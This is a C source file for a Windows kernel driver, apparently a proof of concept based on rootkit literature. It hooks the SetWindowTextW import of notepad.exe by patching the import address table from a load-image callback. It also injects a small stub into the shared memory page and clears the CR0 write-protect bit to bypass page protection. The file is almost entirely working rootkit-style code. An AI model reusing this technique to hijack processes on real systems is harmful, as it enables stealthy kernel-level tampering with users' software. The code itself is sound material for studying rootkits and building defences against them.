/*
 * IatHooking
 *
 * references:
 * http://research.eeye.com/html/papers/download/StepIntoTheRing.pdf (shared stub)
 * http://sandsprite.com/CodeStuff/Understanding_imports.html
 * http://sandsprite.com/CodeStuff/IAT_Hooking.html
 * http://olance.developpez.com/articles/windows/pe-iczelion/import-table/
 * Rootkits, Hoglund
 */

#include <ntddk.h>
#include <ntimage.h>

#define MakePtr(cast, ptr, addValue)		(cast)((unsigned long) ptr + (unsigned long) addValue)
#define SHARED_STUB_USER_ADDR						(void*) 0x7ffe0800
#define SHARED_STUB_KERN_ADDR						(void*) 0xffdf0800 
#define TARGET_PATH                     L"\\Device\\HarddiskVolume1\\WINDOWS\\system32\\notepad.exe"
#define SYM_TO_HOOK                     "SetWindowTextW"

BOOLEAN	gWindowsImageCacheGuard = FALSE;

VOID ImageNotifyRoutine(PUNICODE_STRING fullImageName, HANDLE processID, PIMAGE_INFO imageInfo)
{
	UNICODE_STRING						target;
	PIMAGE_DOS_HEADER					dosHeader;
	PIMAGE_NT_HEADERS					ntHeader;
	PIMAGE_IMPORT_DESCRIPTOR	importDesc;
	BOOLEAN										targetFound;
	unsigned									count, countB;
	void**										importByNameTable;
	void**										importAddressTable;
	char*											symbolName;
	PMDL											mdl;
	void**										importAddressEntryWrite;
	char											to_inject[] = { 0xCC /* Breakpoint */, 
																						0xb8, 0x00, 0x00, 0x00, 0x00 /* mov eax, 0x00000000 <= used as a buffer */, 
																						0xff, 0xe0 /* jmp eax */ };
  
	/* Check if image is our target
   */
	RtlInitUnicodeString(&target, TARGET_PATH);
	targetFound = RtlEqualUnicodeString(fullImageName, &target, FALSE);
	targetFound = (RtlCompareUnicodeString(fullImageName, &target, FALSE) == 0);
	if (targetFound == FALSE)	return;
	/* Target found, Analyze image...
	*/
	dosHeader = (PIMAGE_DOS_HEADER) imageInfo->ImageBase;
	ntHeader = MakePtr(PIMAGE_NT_HEADERS, dosHeader, dosHeader->e_lfanew);
	if (ntHeader->Signature != IMAGE_NT_SIGNATURE) return; /* Check nt signature */
	/* Get a pointer to the import descriptor table
   */
	importDesc = MakePtr(PIMAGE_IMPORT_DESCRIPTOR, 
											 ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress,
											 dosHeader);
	if ((void*) importDesc == (void*) dosHeader) return; /* Check if import desc table is not null */
	/* Browse imported images (DLL)
   */
	for (count = 0; importDesc[count].Characteristics != 0; count++) /* Foreach import descriptor */
	{
		importByNameTable = MakePtr(void**, importDesc[count].OriginalFirstThunk, dosHeader); /* OriginalFirstThunk point to an import by name table */
		if ((void*) importByNameTable == (void*) dosHeader) continue; /* Invalid OriginalFirstThunk, skip image */
		importAddressTable = MakePtr(void**, importDesc[count].FirstThunk, dosHeader); /* FirstThunk point to an iat */
		/* Browse exposed addresses
     */
		for (countB = 0; importAddressTable[countB]; countB++)
		{
			if ((IMAGE_ORDINAL_FLAG & (unsigned long)(importByNameTable[countB])) == IMAGE_ORDINAL_FLAG) continue; /* This entry does not have a symbol but an index, skip it */
			symbolName = (MakePtr(PIMAGE_IMPORT_BY_NAME, importByNameTable[countB], dosHeader))->Name; /* Symbol */
			if (!strcmp(symbolName, SYM_TO_HOOK)) /* Check if we've found the symbol that we want to patch */
			{
				DbgPrint("Target found (%ws:%s)\n", fullImageName->Buffer, symbolName);
				DbgPrint("Import table entry = 0x%x\n", importAddressTable[countB]);
				DbgPrint("Import table entry new value = 0x%x\n", SHARED_STUB_USER_ADDR);
				if (!gWindowsImageCacheGuard)
				{
					/* Copy our code into the shared stub section
           * Should never be erased??
           */
					RtlCopyMemory(&(to_inject[2]), &importAddressTable[countB], sizeof(&importAddressTable[countB]));
					RtlCopyMemory(SHARED_STUB_KERN_ADDR, to_inject, sizeof(to_inject));
					gWindowsImageCacheGuard = TRUE;
				}
				/* Use the CR0 trick to by pass page protection (when CR0/WP == 0, no memory protection)
         * Set CR0 WP bit to 0
         */
				__asm
				{
					push eax
					mov eax, CR0
					and eax, 0FFFEFFFFh
					mov CR0, eax
					pop eax
				}
				importAddressTable[countB] = SHARED_STUB_USER_ADDR; /* Patch entry */
				/* Set CR0 WP bit to 1
         */
				__asm
				{
					push eax
					mov eax, CR0
					or eax, NOT 0FFFEFFFFh
					mov CR0, eax
					pop eax
				}
			}
		}
	}
}

VOID 		DriverUnload(PDRIVER_OBJECT driverObject)
{
	DbgPrint("DriverUnload ...");
	(void) PsRemoveLoadImageNotifyRoutine(ImageNotifyRoutine);
}

NTSTATUS	DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath)
{
	DbgPrint("DriverEntry ...");
	driverObject->DriverUnload = DriverUnload; 
	return PsSetLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotifyRoutine);
}
